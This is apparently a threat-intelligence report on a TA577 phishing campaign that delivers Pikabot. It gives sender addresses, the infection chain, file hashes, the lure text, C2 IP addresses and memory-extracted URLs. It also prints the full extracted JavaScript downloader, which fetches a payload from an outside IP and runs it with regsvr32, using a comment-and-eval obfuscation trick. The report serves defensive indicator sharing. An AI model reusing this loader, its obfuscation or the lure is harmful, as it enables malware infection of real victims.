THREAT IDENTIFICATION: TA577 / PIKABOT

SUBJECTS OBSERVED
All subjects were from previously stolen email threads.

SENDERS OBSERVED
mhermann@functionsandcatering.com
pdyrsu@kayclaudy.ht
zconroy@poupaqui.pt

INFECTION FLOW
eml -> attached .zip -> .xlsx -> .js -> .dll

EMAIL BODY ADDITION
Good day,
I forwarded a document to you yesterday. Were it arrive you?

ATTACHED ZIP FILE HASH
ILLUMDY.zip
ec608a648c66a3574d282f818a5105a2

XLSX FILE HASH
ILLUMDY.xlsx
39c90b991a0f36ff8b84e55886ca08d4

XLSX FILE METADATA
Author: admin
Last Modified By: admin

ADDITIONAL FILE HASH
c
17f3eddc10916861d1a2d7e961eb6561

JAVASCRIPT FILE DOWNLOAD URL
file:///\\85.195.115.20\share\1.js

JAVASCRIPT FILE DOWNLOAD COMMAND
"C:\Windows\System32\WScript.exe" "\\85.195.115.20\share\1.js" 

JAVASCRIPT CONTENTS (EXTRACTED FOM PCAP)
/*
var S5 = new ActiveXObject("msxml2.xmlhttp"), hp = new ActiveXObject("adodb.stream");

S5.open("GET", "http://77.245.76.113/1s6iL/BtCxD", false);
S5.send();

if(S5.status === 200)
{
	hp.type = 1;
	hp.open();
	hp.write(S5.responsebody);
	hp.savetofile("SH.jpg", 2);
	hp.close();
}
*/

/*
var S9 = new ActiveXObject("wscript.shell");
*/

/*
S9.exec("regsvr32 SH.jpg");
*/

function YQ(k0)
{
	var Qr = new ActiveXObject("scripting.filesystemobject");
	var f1 = Qr.opentextfile(WScript.ScriptFullName, 1);
	return(f1.readall());
}
var aF = /\/\*([\s\S]*?)\*\//g;
var B2;

do
{
	B2 = aF.exec(YQ());
	if(B2)
	{
			eval(B2[1]);
	}
}
while(B2);
WScript.quit();

PAYLOAD DOWNLOAD URL
http://77.245.76.113/1s6iL/BtCxD

PAYLOAD FILE HASH
BtCxD
9077167ffc15a50f701533f177562c1e

UNPACKED PAYLOAD FILE HASH
2eb0000.ctfmon.exe
874b9805a469517c1ff472f44b0fe5c8

LIKELY C2s
https://103.82.243.5:13785/
https://108.61.78.17:13783/
https://131.153.231.178:2221/
https://155.138.147.62:2223/
https://172.232.162.97:13783/
https://172.232.189.10:1194/
https://172.232.189.219:2224/
https://37.60.242.85:9785/
https://45.76.251.190:5631/
https://86.38.225.105:13721/
https://86.38.225.106:2221/
https://86.38.225.109:13724/
https://95.179.135.3:2225/

URLS EXTRACTED FROM MEMORY
https://103.82.243.5:13785/
https://103.82.243.5:13785/api/admin.usergroups.addChannels
https://108.61.78.17:13783/
https://108.61.78.17:13783/api/admin.conversations.ekm.listOriginalConnectedChannelInfo
https://108.61.78.17:13783/api/apps.permissions.scopes.list
https://131.153.231.178:2221/api/admin.teams.admins.list
https://155.138.147.62:2223/api/admin.teams.admins.list
https://172.232.162.97:13783/api/admin.apps.restricted.list
https://172.232.162.97:13783/api/api.test
https://172.232.189.10:1194/
https://172.232.189.10:1194/api/admin.inviteRequests.denied.list
https://172.232.189.219:2224/api/apps.permissions.users.list
https://37.60.242.85:9785/api/admin.conversations.restrictAccess.addGroup
https://45.76.251.190:5631/api/admin.inviteRequests.list
https://86.38.225.105:13721/
https://86.38.225.105:13721/api/admin.teams.settings.setDiscoverability
https://86.38.225.105:13721/api/apps.permissions.users.list
https://86.38.225.106:2221/api/admin.conversations.ekm.listOriginalConnectedChannelInfo
https://86.38.225.109:13724/api/admin.inviteRequests.deny
https://95.179.135.3:2225/api/admin.teams.settings.setDiscoverability

